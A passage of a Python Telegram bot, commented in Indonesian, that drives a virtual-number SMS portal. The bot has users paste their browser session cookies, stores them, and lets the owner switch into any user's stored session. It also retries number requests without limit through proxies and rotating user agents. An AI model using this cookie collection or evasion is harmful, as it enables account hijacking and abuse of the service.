
{footer}"""

TEMPLATE_COOKIES = """
{header}
Kirim cookies dengan perintah:
<code>/cookies &lt;isi cookies kamu&gt;</code>

<b>Cara ambil cookies (Chrome Android):</b>
1. Login di https://ivas.tempnum.qzz.io via <b>Chrome Android</b>
2. Gunakan Kiwi Browser / Eruda, atau remote debug USB
3. Salin header <code>Cookie:</code> dari request ke portal
4. Paste ke bot — UA harus tetap <b>Android</b>

{footer}"""

TEMPLATE_BULK = """
{header}
<b>PERINGATAN!</b>
Tindakan ini akan menghapus <b>SEMUA</b> nomor
yang ada di akun iVASMS kamu.

Apakah kamu yakin ingin melanjutkan?

{footer}"""

TEMPLATE_EXPORT = """
{header}
Pilih format file untuk export daftar nomor aktif.

{footer}"""

TEMPLATE_SUCCESS = """
{header}
{message}

{footer}"""

TEMPLATE_ERROR = """
{header}
{message}

{footer}"""

def _build(template: str, title: str, breadcrumb: str = "", **kwargs) -> str:
    """Render template dengan header/footer otomatis."""
    return template.format(
        header=_header(title, breadcrumb),
        footer=_footer(),
        em_e2=em(E2, '⭐'),
        em1=em(E1, '⭐'),
        em2=em(E2, '⭐'),
        em3=em(E4, '⭐'),
        em4=em(E5, '⭐'),
        em6=em(E6, '⭐'),
        em_profile=em(CE_PROFILE, '👤'),
        em_email=em(CE_EMAIL, '📩'),
        em_negara=em(CE_NEGARA, '🌏'),
        em_waktu=em(CE_WAKTU, '⏲'),
        em_file=em(CE_FILE, '📁'),
        em_phone=em(CE_NOMOR, '📞'),
        dashboard_info=kwargs.pop('dashboard_info', ''),
        session_warn=kwargs.pop('session_warn', ''),
        onboard_tip=kwargs.pop('onboard_tip', ''),
        **kwargs
    )


def _sms_matches_app_filter(sender_raw, text_raw, app_filter):
    """Cek apakah SMS cocok dengan filter app monitor/SMS aktif."""
    if not app_filter or app_filter == 'all':
        return True
    keywords = APP_FILTER_KEYWORDS.get(app_filter)
    if not keywords:
        keywords = [app_filter]
    combined = f"{sender_raw or ''} {text_raw or ''}".lower()
    return any(k in combined for k in keywords)


def get_user_prefs(user_id):
    try:
        cur.execute(
            "SELECT monitor_app_filter, monitor_compact, onboarded FROM user_preferences WHERE user_id = ?",
            (user_id,),
        )
        row = cur.fetchone()
        if row:
            return {'monitor_app_filter': row[0] or 'all', 'monitor_compact': bool(row[1]), 'onboarded': bool(row[2])}
    except Exception:
        pass
    return {'monitor_app_filter': 'all', 'monitor_compact': False, 'onboarded': False}


def set_user_pref(user_id, **kwargs):
    prefs = get_user_prefs(user_id)
    prefs.update(kwargs)
    try:
        cur.execute(
            """INSERT INTO user_preferences (user_id, monitor_app_filter, monitor_compact, onboarded)
               VALUES (?, ?, ?, ?)
               ON CONFLICT(user_id) DO UPDATE SET
                 monitor_app_filter = excluded.monitor_app_filter,
                 monitor_compact = excluded.monitor_compact,
                 onboarded = excluded.onboarded""",
            (user_id, prefs.get('monitor_app_filter', 'all'),
             int(prefs.get('monitor_compact', False)),
             int(prefs.get('onboarded', False))),
        )
        conn.commit()
    except Exception:
        pass


def get_favorite_ranges(user_id, limit=5):
    try:
        cur.execute(
            "SELECT range_name FROM favorite_ranges WHERE user_id = ? ORDER BY added_at DESC LIMIT ?",
            (user_id, limit),
        )
        return [r[0] for r in cur.fetchall()]
    except Exception:
        return []


def add_favorite_range(user_id, range_name):
    try:
        cur.execute(
            "INSERT OR IGNORE INTO favorite_ranges (user_id, range_name) VALUES (?, ?)",
            (user_id, range_name.strip()),
        )
        conn.commit()
        return True
    except Exception:
        return False


def remove_favorite_range(user_id, range_name):
    try:
        cur.execute("DELETE FROM favorite_ranges WHERE user_id = ? AND range_name = ?", (user_id, range_name))
        conn.commit()
        return True
    except Exception:
        return False


def _app_filter_label(app_filter):
    labels = {
        'all': '📋 Semua', 'whatsapp': '💬 WA', 'telegram': '✈️ TG', 'tiktok': '🎵 TikTok',
        'facebook': '👤 FB', 'instagram': '📷 IG', 'google': '🔍 Google',
        'microsoft': '🪟 MS', 'viber': '📞 Viber',
    }
    return labels.get(app_filter, app_filter)


def get_sub_sms_keyboard(user_id):
    mon = '🟢' if user_id in active_notif_monitor else '🔴'
    aktif = '🟢' if user_id in sms_aktif_users else '🔴'
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("LIVE SMS", callback_data=f"live_sms_{user_id}", icon_custom_emoji_id=CE_LIVE, style="primary")],
        [InlineKeyboardButton(f"MONITOR SMS {mon}", callback_data=f"menu_notif_{user_id}", icon_custom_emoji_id=CE_MONITOR, style="primary")],
        [InlineKeyboardButton("FILTER MONITOR", callback_data=f"monitor_filter_{user_id}", style="primary")],
        [InlineKeyboardButton(f"SMS AKTIF {aktif}", callback_data=f"smsaktif_menu_{user_id}", style="success")],
        [InlineKeyboardButton("RIWAYAT SMS", callback_data=f"sms_hist_{user_id}_0", icon_custom_emoji_id=CE_FILE, style="primary")],
        [InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")],
    ])


def get_sub_nomor_keyboard(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("ADD RANGE", callback_data=f"menu_addrange_{user_id}", icon_custom_emoji_id=CE_ADD, style="primary")],
        [InlineKeyboardButton("FAVORIT RANGE", callback_data=f"menu_fav_{user_id}", icon_custom_emoji_id=CE_ADD, style="success")],
        [InlineKeyboardButton("EXPORT", callback_data=f"menu_export_{user_id}", icon_custom_emoji_id=CE_EXPORT, style="success"),
         InlineKeyboardButton("HAPUS SEMUA", callback_data=f"menu_bulk_{user_id}", icon_custom_emoji_id=CE_HAPUS, style="danger")],
        [InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")],
    ])


def get_sub_data_keyboard(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("ALL PLATFORM", callback_data=f"all_menu_{user_id}", icon_custom_emoji_id=CE_PLATFORM, style="primary")],
        [InlineKeyboardButton("NEGARA AKTIF", callback_data=f"top_refresh_{user_id}", icon_custom_emoji_id=CE_NEGARA, style="primary")],
        [InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")],
    ])


def get_sub_akun_keyboard(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("AKUN SAYA", callback_data=f"menu_accounts_{user_id}", icon_custom_emoji_id=CE_AKUN, style="success")],
        [InlineKeyboardButton("MENU USER", callback_data=f"user_menu_{user_id}", icon_custom_emoji_id=CE_FILE, style="primary")],
        [InlineKeyboardButton("BANTUAN", callback_data=f"menu_help_{user_id}", icon_custom_emoji_id=CE_HELP, style="primary")],
        [InlineKeyboardButton("LOGOUT", callback_data=f"logout_menu_{user_id}", icon_custom_emoji_id=CE_KELUAR, style="danger")],
        [InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")],
    ])


def get_main_keyboard(user_id, logged_in=False):
    keyboard = []
    
    if user_id == USER_ID:
        keyboard.append([
            InlineKeyboardButton("MENU OWNER", callback_data="owner_menu", icon_custom_emoji_id="5436078005615086151", style="primary")
        ])
    
    if logged_in:
        keyboard.append([
            InlineKeyboardButton("SMS & NOTIF", callback_data=f"sub_sms_{user_id}", icon_custom_emoji_id=CE_MONITOR, style="primary"),
            InlineKeyboardButton("NOMOR", callback_data=f"sub_nomor_{user_id}", icon_custom_emoji_id=CE_NOMOR, style="primary"),
        ])
        keyboard.append([
            InlineKeyboardButton("DATA", callback_data=f"sub_data_{user_id}", icon_custom_emoji_id=CE_NEGARA, style="success"),
            InlineKeyboardButton("AKUN & TOOLS", callback_data=f"sub_akun_{user_id}", icon_custom_emoji_id=CE_AKUN, style="success"),
        ])
        keyboard.append([
            InlineKeyboardButton("LINE EXTRACTOR", callback_data=f"menu_line_{user_id}", icon_custom_emoji_id=CE_LINE, style="primary"),
        ])
        # ── FIX MERAH (public, terbuka untuk semua user) ──
        keyboard.append([
            InlineKeyboardButton("FIX MERAH", callback_data=f"fixmenu_{user_id}",
                                 icon_custom_emoji_id=CE_WHATSAPP, style="danger"),
        ])
        keyboard.append([
            InlineKeyboardButton("CHECK TELEGRAM", callback_data=f"menu_check_{user_id}", icon_custom_emoji_id=CE_TELEGRAM, style="success"),
        ])
        keyboard.append([
            InlineKeyboardButton("BANTUAN", callback_data=f"menu_help_{user_id}", icon_custom_emoji_id=CE_HELP, style="primary"),
        ])
    else:
        keyboard.append([
            InlineKeyboardButton("LOGIN COOKIES", callback_data=f"menu_cookies_{user_id}", icon_custom_emoji_id=CE_LOGIN, style="primary"),
        ])
        # ── FIX MERAH (langsung di bawah LOGIN COOKIES) ──
        keyboard.append([
            InlineKeyboardButton("FIX MERAH", callback_data=f"fixmenu_{user_id}",
                                 icon_custom_emoji_id=CE_WHATSAPP, style="danger"),
        ])
        keyboard.append([
            InlineKeyboardButton("CHECK TELEGRAM", callback_data=f"menu_check_{user_id}", icon_custom_emoji_id=CE_TELEGRAM, style="success"),
        ])
        keyboard.append([
            InlineKeyboardButton("LINE EXTRACTOR", callback_data=f"menu_line_{user_id}", icon_custom_emoji_id=CE_LINE, style="primary"),
            InlineKeyboardButton("BANTUAN", callback_data=f"menu_help_{user_id}", icon_custom_emoji_id=CE_HELP, style="primary"),
        ])
        keyboard.append([
            InlineKeyboardButton("TUTUP", callback_data=f"menu_close_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")
        ])
    
    return InlineKeyboardMarkup(keyboard)

MAINTENANCE_MODE = False  # legacy bool, kept in sync with MAINTENANCE_STATE['all']

# Per-feature maintenance toggles. `all` = global blanket maintenance.
# Feature keys cover the major user-facing surfaces; tambah disini kalau ada
# fitur baru biar /mt on <feature> bisa dipakai.
MAINTENANCE_FEATURES = (
    'all',       # blanket — block everything kecuali bypass list (fix tetap public)
    'fix',       # /fix + inline FIX MERAH
    'ivas',      # iVASMS dashboard (start, sms, nomor, akun, data)
    'create',    # /create akun
    'proxy',     # /proxy owlproxy
    'line',      # line extractor
    'sms',       # notif/monitor/live/top
    'set',       # /set, /reset template
    'adduser',   # /adduser, /deluser, /listuser
    'check',     # /check telegram account checker
)
MAINTENANCE_STATE = {k: False for k in MAINTENANCE_FEATURES}


def _maintenance_path_json():
    return "maintenance.json"


def load_maintenance_status():
    """Muat status maintenance. Format baru: JSON ({feature: bool}).
    Fallback: format lama maintenance.txt (single 'on'/'off' = all)."""
    global MAINTENANCE_MODE, MAINTENANCE_STATE
    try:
        if os.path.exists(_maintenance_path_json()):
            import json as _json
            with open(_maintenance_path_json(), "r", encoding="utf-8") as f:
                data = _json.load(f)
            if isinstance(data, dict):
                for k in MAINTENANCE_FEATURES:
                    MAINTENANCE_STATE[k] = bool(data.get(k, False))
        elif os.path.exists("maintenance.txt"):
            with open("maintenance.txt", "r") as f:
                MAINTENANCE_STATE['all'] = (f.read().strip() == "on")
    except Exception:
        for k in MAINTENANCE_FEATURES:
            MAINTENANCE_STATE[k] = False
    MAINTENANCE_MODE = bool(MAINTENANCE_STATE.get('all', False))


def save_maintenance_status():
    """Persist per-feature state ke JSON + tetap tulis txt untuk kompat."""
    global MAINTENANCE_MODE
    MAINTENANCE_MODE = bool(MAINTENANCE_STATE.get('all', False))
    try:
        import json as _json
        with open(_maintenance_path_json(), "w", encoding="utf-8") as f:
            _json.dump(MAINTENANCE_STATE, f, indent=2)
    except Exception:
        pass
    # Legacy txt — biar tool lama yang masih baca file ini tetap jalan.
    try:
        with open("maintenance.txt", "w") as f:
            f.write("on" if MAINTENANCE_STATE.get('all', False) else "off")
    except Exception:
        pass


def is_under_maintenance(feature: str) -> bool:
    """True kalau feature spesifik atau 'all' lagi aktif."""
    if MAINTENANCE_STATE.get('all', False):
        return True
    return bool(MAINTENANCE_STATE.get(feature, False))


def _detect_maintenance_feature(update) -> str:
    """Tebak fitur apa yang sedang dipakai user untuk dicek statusnya.

    Default: 'all' (paling restrictive). Kalau text/callback bisa di-mapping
    ke fitur spesifik, return key fitur tersebut.
    """
    try:
        text = ""
        if update.message and update.message.text:
            text = update.message.text.lstrip().lower()
        cb_data = update.callback_query.data if update.callback_query else ""

        # Command → feature
        cmd_map = [
            ('/fix',      'fix'),
            ('/set',      'set'),
            ('/reset',    'set'),
            ('/create',   'create'),
            ('/proxy',    'proxy'),
            ('/line',     'line'),
            ('/notif',    'sms'),
            ('/stopnotif','sms'),
            ('/live',     'sms'),
            ('/top',      'sms'),
            ('/nomor',    'ivas'),
            ('/akun',     'ivas'),
            ('/all',      'ivas'),
            ('/add',      'ivas'),
            ('/bulk',     'ivas'),
            ('/addrange', 'ivas'),
            ('/fav',      'ivas'),
            ('/logout',   'ivas'),
            ('/cookies',  'ivas'),
            ('/stats',    'ivas'),
            ('/switch',   'ivas'),
            ('/unswitch', 'ivas'),
            # /start dan /help SENGAJA tidak dipetakan ke 'ivas' supaya dashboard
            # tetap bisa dibuka (di sana ada tombol FIX MERAH publik).
            ('/adduser',  'adduser'),
            ('/deluser',  'adduser'),
            ('/listuser', 'adduser'),
        ]
        for prefix, feat in cmd_map:
            if text.startswith(prefix):
                return feat

        # Callback → feature
        if cb_data:
            cb_map = [
                ('fixmenu_',      'fix'),
                ('fix_confirm_',  'fix'),
                ('fix_cancel_',   'fix'),
                ('fix_input_',    'fix'),
                ('create_',       'create'),
                ('menu_line_',    'line'),
                ('menu_check_',   'check'),
                ('tgcheck_',      'check'),
                ('sub_sms_',      'sms'),
                ('notif_',        'sms'),
                ('sub_nomor_',    'ivas'),
                ('sub_data_',     'ivas'),
                ('sub_akun_',     'ivas'),
                ('menu_cookies_', 'ivas'),
                ('menu_help_',    'ivas'),
                ('menu_close_',   'ivas'),
                ('owner_menu',    'ivas'),
            ]
            for prefix, feat in cb_map:
                if cb_data.startswith(prefix):
                    return feat
    except Exception:
        pass
    return 'all'


load_maintenance_status()

async def check_maintenance(update: Update) -> bool:
    """Return True jika fitur yang sedang dipakai user dalam maintenance.

    Resolusinya per-fitur: kalau /mt on fix → cuma /fix dan inline FIX MERAH
    yang nge-block; sisanya jalan normal. /mt on (atau /mt on all) = blanket.
    """
    if not update.effective_user:
        return False

    # ── Bypass keras: /fix, /set, /reset SELALU public, walau maintenance ON ──
    try:
        if update.message and update.message.text:
            tx = update.message.text.lstrip().lower()
            # Kecuali fitur 'fix' lagi di-maintenance secara eksplisit, /fix selalu jalan.
            if tx.startswith(("/set", "/reset")):
                if not is_under_maintenance('set'):
                    return False
            if tx.startswith("/fix"):
                if not is_under_maintenance('fix'):
                    return False
        if update.callback_query and update.callback_query.data:
            cb = update.callback_query.data
            if cb.startswith(("fix_confirm_", "fix_cancel_", "fixmenu_", "fix_input_")):
                if not is_under_maintenance('fix'):
                    return False
            if cb.startswith(("create_confirm_", "create_cancel_")):
                if not is_under_maintenance('create'):
                    return False
    except Exception:
        pass

    user_id = update.effective_user.id
    if is_owner(user_id):
        return False  # Owner kebal maintenance

    feature = _detect_maintenance_feature(update)
    if not is_under_maintenance(feature):
        return False

    # Block. Hanya tampilkan pesan di private chat (di grup diam-diam).
    chat = update.effective_chat
    is_private = bool(chat and chat.type == "private")
    if is_private:
        pretty = feature.upper() if feature != 'all' else 'SEMUA FITUR'
        text = (
            f"🔧 <b>MAINTENANCE MODE — {pretty}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Maaf, fitur ini sedang dalam pemeliharaan oleh owner.\n"
            f"Silakan coba lagi beberapa saat lagi.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        try:
            if update.message:
                await update.message.reply_text(text, parse_mode=ParseMode.HTML)
            elif update.callback_query:
                await update.callback_query.answer(
                    f"Fitur {pretty} sedang maintenance.",
                    show_alert=True,
                )
        except Exception:
            pass
    else:
        if update.callback_query:
            try:
                await update.callback_query.answer()
            except Exception:
                pass
    return True

def maintenance_guard(handler_func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if await check_maintenance(update):
            return
        return await handler_func(update, context, *args, **kwargs)
    return wrapped

def is_owner(user_id):
    """Cek apakah user adalah owner"""
    return user_id == USER_ID

def update_user_username(user):
    """Auto-update username Telegram user di DB setiap kali interact.
    Dipanggil dari start_command, handle_message, dll agar username selalu fresh."""
    if not user:
        return
    try:
        uid = user.id
        uname = user.username  # bisa None jika user tidak punya username
        cur.execute("SELECT username FROM allowed_users WHERE user_id = ?", (uid,))
        row = cur.fetchone()
        if row is not None:
            old_uname = row[0]
            if old_uname != uname:
                cur.execute("UPDATE allowed_users SET username = ? WHERE user_id = ?", (uname, uid))
                conn.commit()
    except Exception:
        pass

def resolve_username_to_id(username_str, context=None):
    """Resolve @username ke user_id. Cari di DB dulu.
    Returns (user_id, username, error_msg). error_msg is None on success."""
    uname = username_str.lstrip('@')
    # 1) Cari di allowed_users
    try:
        cur.execute("SELECT user_id FROM allowed_users WHERE username = ? COLLATE NOCASE", (uname,))
        row = cur.fetchone()
        if row:
            return row[0], uname, None
    except Exception:
        pass
    # 2) Cari di user_sessions
    try:
        cur.execute("SELECT user_id FROM user_sessions WHERE email LIKE ?", (f"%{uname}%",))
        row = cur.fetchone()
        if row:
            return row[0], uname, None
    except Exception:
        pass
    return None, uname, (
        f"Username @{uname} tidak ditemukan di database.\n\n"
        f"<b>Solusi:</b>\n"
        f"\u2022 Pastikan user sudah pernah /start ke bot ini\n"
        f"\u2022 Atau gunakan User ID (angka) langsung"
    )

async def resolve_username_to_id_async(username_str, context):
    """Resolve @username ke user_id \u2014 sync DB lalu async bot.get_chat fallback.
    Returns (user_id, username, error_msg)."""
    uid, uname, err = resolve_username_to_id(username_str)
    if uid:
        return uid, uname, None
    # 3) Fallback: bot.get_chat
    try:
        chat = await context.bot.get_chat(f"@{uname}")
        return chat.id, chat.username or uname, None
    except Exception:
        pass
    return None, uname, (
        f"Username @{uname} tidak ditemukan.\n\n"
        f"<b>Solusi:</b>\n"
        f"\u2022 Minta user kirim /start ke bot ini dulu\n"
        f"\u2022 Atau gunakan User ID (angka) langsung"
    )

def is_allowed_user(user_id):
    """Cek apakah user diizinkan menggunakan bot"""
    if is_owner(user_id):
        return True
    
    if MAINTENANCE_MODE:
        return False
    
    try:
        cur.execute("SELECT user_id FROM allowed_users WHERE user_id = ?", (user_id,))
        return cur.fetchone() is not None
    except:
        return is_owner(user_id)

def get_progress_keyboard(task_id, user_id):
    """Keyboard progress dengan tombol STOP"""
    keyboard = [
        [InlineKeyboardButton("STOP", callback_data=f"stop_{task_id}_{user_id}", icon_custom_emoji_id="5870778972857438051", style="danger")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_result_keyboard(user_id):
    """Keyboard hasil dengan tombol kembali ke menu"""
    keyboard = [
        [InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_bulk_keyboard(user_id):
    keyboard = [
        [
            InlineKeyboardButton("KONFIRMASI", callback_data=f"bulk_confirm_{user_id}", style="danger"),
            InlineKeyboardButton("BATAL", callback_data=f"menu_start_{user_id}", style="success")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_export_keyboard(user_id):
    keyboard = [
        [
            InlineKeyboardButton("EXCEL", callback_data=f"export_xlsx_{user_id}", style="primary"),
            InlineKeyboardButton("TEXT", callback_data=f"export_txt_{user_id}", style="primary")
        ],
        [InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", style="danger")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard(user_id):
    keyboard = [[InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", style="danger")]]
    return InlineKeyboardMarkup(keyboard)


def extract_csrf_from_page(html):
    match = re.search(r'<meta name="csrf-token" content="([^"]+)"', html)
    if match:
        return match.group(1)
    match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', html)
    if match:
        return match.group(1)
    return None

def extract_profile_from_html(html):
    """Ekstrak profile dari HTML halaman profile - VERSI DIPERBAIKI"""
    profile = {
        'name': None,
        'email': None,
        'country': None,
        'phone': None
    }
    
    try:
        
        name_match = re.search(r'<h4 class="mb-1">([^<]+)</h4>', html)
        if name_match:
            profile['name'] = name_match.group(1).strip()
            
        
        
        email_input = re.search(r'<input[^>]*name="email"[^>]*value="([^"]+)"', html)
        if email_input:
            profile['email'] = email_input.group(1).strip()
            
        else:
            
            email_text = re.search(r'<h5 class="fs-0 fw-normal">([^<]+@[^<]+)</h5>', html)
            if email_text:
                profile['email'] = email_text.group(1).strip()
                
            else:
                
                cf_email = re.search(r'__cf_email__[^>]+data-cfemail="([^"]+)"', html)
                if cf_email:
                    encoded = cf_email.group(1)
                    profile['email'] = decode_cf_email(encoded)
                    
        
        
        country_match = re.search(r'<p class="text-500">([^<]+)</p>', html)
        if country_match:
            profile['country'] = country_match.group(1).strip()
            print(f"[DEBUG] Country: {profile['country']}")
        
        
        phone_match = re.search(r'<p class="text-500">(\d+)</p>', html)
        if phone_match:
            profile['phone'] = phone_match.group(1).strip()
            print(f"[DEBUG] Phone dari p: {profile['phone']}")
        else:
            phone_input = re.search(r'<input[^>]*name="phone"[^>]*value="(\d+)"', html)
            if phone_input:
                profile['phone'] = phone_input.group(1).strip()
                print(f"[DEBUG] Phone dari input: {profile['phone']}")
        
        return profile
        
    except Exception as e:
        print(f"Error extract_profile: {e}")
        return profile

def decode_cf_email(encoded):
    """Decode Cloudflare protected email"""
    try:
        r = int(encoded[:2], 16)
        email = ''.join([chr(int(encoded[i:i+2], 16) ^ r) for i in range(2, len(encoded), 2)])
        return email
    except:
        return None
    
def validate_cookies_text(text: str) -> tuple[bool, str]:
    """Validate cookies string before extracting and using it.
    Returns (is_valid, error_message)."""
    if not text or len(text.strip()) < 10:
        return False, "Cookies terlalu pendek atau kosong."
        
    lower_text = text.lower()
    
    # Must contain ivas_sms_session
    if "ivas_sms_session" not in lower_text:
        return False, "Cookies tidak mengandung session 'ivas_sms_session'. Pastikan Anda meng-copy seluruh header cookie dari browser."
        
    # Must contain XSRF-TOKEN
    if "xsrf-token" not in lower_text:
        return False, "Cookies tidak mengandung 'XSRF-TOKEN'. Pastikan Anda meng-copy seluruh header cookie dari browser."
        
    return True, ""

def extract_cookies_from_text(text):
    """Ekstrak cookies dari string HTTP request"""
    cookies = {}
    
    
    for line in text.split('\n'):
        if 'cookie:' in line.lower():
            cookie_part = line.lower().split('cookie:')[1].strip()
            for cookie in cookie_part.split(';'):
                if '=' in cookie:
                    key, val = cookie.strip().split('=', 1)
                    cookies[key.strip()] = val.strip().strip('"').strip("'")
            return cookies
    
    
    for part in text.split(';'):
        if '=' in part:
            key, val = part.strip().split('=', 1)
            cookies[key.strip()] = val.strip()
    
    return cookies

def save_cookies_session(user_id, email, session, csrf, profile=None):
    """Simpan session cookies ke database dengan profile lengkap (Multi-Account)"""
    try:
        cookies_dict = session.cookies.get_dict()
        
        if not profile:
            profile = {'name': None, 'email': email, 'country': None, 'phone': None}
        else:
            if not profile.get('email') and email:
                profile['email'] = email
        
        session_data = {
            'cookies': cookies_dict,
            'csrf': csrf,
            'login_method': 'cookies',
            'profile': profile,
            'user_agent': session.headers.get('User-Agent', DEFAULT_IVAS_UA),
        }
        
        # Set semua akun user ini jadi tidak aktif
        cur.execute("UPDATE user_sessions SET is_active = 0 WHERE user_id = ?", (user_id,))
        
        # Simpan atau update akun spesifik ini dan set jadi aktif
        cur.execute("""
            INSERT INTO user_sessions (user_id, email, password, session_data, is_active, last_used)
            VALUES (?, ?, ?, ?, 1, datetime('now'))
            ON CONFLICT(user_id, email) DO UPDATE SET
                session_data = excluded.session_data,
                is_active = 1,
                last_used = datetime('now')
        """, (user_id, email, '', json.dumps(session_data)))
        
        conn.commit()
        print(f"[DEBUG] Session {email} disimpan dan diaktifkan untuk user {user_id}")
        return True, email
    except Exception as e:
        print(f"Error save session: {e}")
        return False, str(e)

    
def get_user_session(user_id):
    """Ambil session user yang SEDANG AKTIF dari database"""
    try:
        # Intercept untuk owner agar bisa switch akun
        if user_id == USER_ID:
            try:
                cur.execute("SELECT target_user_id, target_email FROM owner_switch WHERE owner_id = ?", (USER_ID,))
                switch_row = cur.fetchone()
                if switch_row:
                    target_user_id, target_email = switch_row
                    cur.execute("SELECT email, session_data FROM user_sessions WHERE user_id = ? AND email = ?", (target_user_id, target_email))
                    row = cur.fetchone()
                    if row:
                        email, session_data_json = row
                        if session_data_json:
                            data = json.loads(session_data_json)
                            session = requests.Session()
                            if 'cookies' in data:
                                session.cookies.update(data['cookies'])
                            session.headers.update({
                                'User-Agent': session.headers.get('User-Agent', get_random_user_agent()),
                                'X-Requested-With': 'XMLHttpRequest',
                                'Accept': 'application/json, text/plain, */*'
                            })
                            csrf = data.get('csrf')
                            profile = data.get('profile', {})
                            return email, profile.get('name'), profile.get('country'), profile.get('phone'), data.get('cookies', {}), csrf, True
            except Exception as se:
                print(f"Error in owner switch logic: {se}")

        # Cari akun yang is_active = 1
        cur.execute("SELECT email, session_data FROM user_sessions WHERE user_id = ? AND is_active = 1", (user_id,))
        row = cur.fetchone()
        
        # Jika tidak ada yang aktif, coba ambil akun terakhir yang digunakan
        if not row:
            cur.execute("SELECT email, session_data FROM user_sessions WHERE user_id = ? ORDER BY last_used DESC LIMIT 1", (user_id,))
            row = cur.fetchone()
            if row:
                # Set akun ini jadi aktif biar selanjutnya gampang
                cur.execute("UPDATE user_sessions SET is_active = 1 WHERE user_id = ? AND email = ?", (user_id, row[0]))
                conn.commit()
        
        if not row:
            return None, None, None, None, None, None, False
        
        email, session_data_json = row
        if not session_data_json:
            return None, None, None, None, None, None, False
        
        data = json.loads(session_data_json)
        session = requests.Session()
        if 'cookies' in data:
            session.cookies.update(data['cookies'])
        
        session.headers.update({
            'User-Agent': session.headers.get('User-Agent', get_random_user_agent()),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/plain, */*'
        })
        
        csrf = data.get('csrf')
        profile = data.get('profile', {})
        return email, profile.get('name'), profile.get('country'), profile.get('phone'), data.get('cookies', {}), csrf, True

        
    except Exception as e:
        print(f"Error get session: {e}")
        import traceback
        traceback.print_exc()
        return None, None, None, None, None, None, False
    
def check_user_login(user_id):
    """Cek apakah user sudah login"""
    email, _, _, _, _, _, logged_in = get_user_session(user_id)
    return logged_in

def is_admin(user_id):
    if user_id == USER_ID:
        return True
    cur.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
    return cur.fetchone() is not None


def search_numbers(session, csrf, search_term, page=1):
    """Cari termination ID berdasarkan range name"""
    try:
        url = f"{BASE_URL}/portal/numbers/test"
        params = {
            'draw': page + 7,
            'columns[0][data]': 'range',
            'columns[0][name]': 'terminations.range',
            'columns[1][data]': 'test_number',
            'columns[1][name]': 'terminations.test_number',
            'start': (page - 1) * 50,
            'length': 50,
            'search[value]': search_term,
            '_': int(time.time() * 1000)
        }
        
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRF-TOKEN': csrf,
            'Referer': f"{BASE_URL}/portal/numbers/test",
            'Accept': 'application/json'
        }
        
        response = session.get(url, params=params, headers=headers, timeout=15)
        
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        print(f"Search error: {e}")
        return None

def add_number(session, csrf, termination_id, max_retries=0):
    """Tambah nomor via HTTP - auto retry sampai BISA (kecuali account_full).
    max_retries=0 berarti retry tak terbatas sampai sukses atau account_full.
    """
    apply_proxy_to_session(session)
    import random as _r
    attempt = 0
    while True:
        attempt += 1
        try:
            data = {'_token': csrf, 'id': termination_id}
            headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'X-CSRF-TOKEN': csrf,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': f"{BASE_URL}/portal/numbers/test"
            }

            response = session.post(f"{BASE_URL}/portal/numbers/termination/number/add",
                                   data=data, headers=headers, timeout=15)

            if response.status_code == 200:
                try:
                    result = response.json()
                    msg = result.get('message', '').lower()
                    if "success" in msg or "done" in msg or "added" in msg:
                        return {'success': True, 'message': result.get('message')}
                    # 200 tapi pesan tidak sukses -> cek account full
                    if any(k in msg for k in MAX_NUMBERS_KEYWORDS):
                        return {'success': False, 'reason': 'account_full', 'message': result.get('message')}
                    # retry kasus lain
                    last_reason = f'http_200_msg:{msg[:40]}'
                except:
                    return {'success': True, 'message': 'Added'}
            elif response.status_code == 400:
                try:
                    result = response.json()
                    msg = result.get('message', '').lower()
                    if "maximum limit" in msg or "account full" in msg or any(k in msg for k in MAX_NUMBERS_KEYWORDS):
                        return {'success': False, 'reason': 'account_full', 'message': result.get('message')}
                except:
                    pass
                last_reason = 'http_400'
            elif response.status_code == 429:
                last_reason = 'http_429'
            elif response.status_code in (401, 403):
                # auth/permission - tidak bisa diperbaiki dengan retry
                return {'success': False, 'reason': f'http_{response.status_code}'}
            else:
                last_reason = f'http_{response.status_code}'

        except Exception as e:
            last_reason = f'exception:{str(e)[:40]}'

        # batasi jika dipanggil dengan max_retries spesifik
        if max_retries and attempt >= max_retries:
            return {'success': False, 'reason': last_reason}

        # backoff: cepat di awal, tambah seiring percobaan, jangan lebih dari 5s
        if last_reason == 'http_429':
            delay = min(5.0, 0.8 + attempt * 0.3) + _r.uniform(0, 0.4)
        else:
            delay = min(3.0, 0.4 + attempt * 0.2) + _r.uniform(0, 0.2)
        time.sleep(delay)


def login_with_cookies(cookies_dict):
    """Login ke iVASMS - return (session, csrf, profile, error_code)"""
    session = requests.Session()
    apply_proxy_to_session(session)
    
    for key, value in cookies_dict.items():
        session.cookies.set(key, value)
    
    session.headers.update({
        'User-Agent': DEFAULT_IVAS_UA,
